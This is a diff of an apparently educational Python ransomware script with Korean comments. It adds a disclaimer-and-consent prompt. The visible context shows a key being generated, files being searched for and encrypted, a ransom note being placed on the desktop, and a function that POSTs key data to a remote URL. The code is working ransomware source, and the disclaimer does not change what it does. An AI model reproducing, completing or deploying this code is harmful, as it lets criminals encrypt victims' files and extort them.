@@ -5,6 +5,8 @@ import requests
 from cryptography.fernet import Fernet
     
 def main():
+    warning()
+    
     encryption_key=generate_encryption_key()
     search_and_encrypt_files(encryption_key)
     
@@ -25,15 +27,13 @@ def generate_encryption_key(length=32):
     secret_token=secrets.token_hex(length)
     byte_secret_token=bytes.fromhex(secret_token)
     encoded_key=base64.urlsafe_b64encode(byte_secret_token)
-    
     return encoded_key
-
 
 def search_and_encrypt_files(key):
     """
     @breif : 시스템 내 파일 탐색 및 암호화 실행
     @param : 생성된 암호화키
-    @return : 성공과 실패 여부
+    @return : None
     """
 
     def search_file(directory:str, *extension:tuple[str]):
@@ -71,11 +71,10 @@ def search_and_encrypt_files(key):
         encrypt_file(file)
     return
 
-
 def create_and_display_ransom_note(id):
     """
     @breif : 사용자에게 요구사항을 알리는 랜섬노트 생성 및 표시
-    @param : None
+    @param : 사용자를 식별할 id
     @return : None
     """
     def __find_desktop_path__():
@@ -152,6 +151,21 @@ def send_key(text):
     response = requests.post(url, data=data)
     print(response.text)
     return
+
+def warning():
+    print("================================== 주의사항 ==================================")
+    print("본 프로그램은 교육 및 연구 목적으로만 제공됩니다.")
+    print("이 프로그램이나 이로 인해 파생된 어떠한 소프트웨어도 실제 환경에서의 사용을 목적으로 하지 않습니다.")
+    print("악의적 목적이나 불법 행위에 사용될 수 없습니다.")
+    print()
+    print("사용자는 본 프로그램을 사용함에 있어 발생하는 모든 위험을 부담하며,")
+    print("프로그램 사용으로 인한 모든 결과에 대한 책임은 전적으로 사용자에게 있습니다.")
+    print("=============================================================================")
+    print()
+    print("계속 진행하시려면 아래 문장을 정확히 입력해주세요.")
+    consent=input("주의사항을 숙지하였습니다\n")
+    if consent.replace(" ","")!='주의사항을숙지하였습니다':
+        exit(-1)
 
 if __name__ == "__main__":
     main()
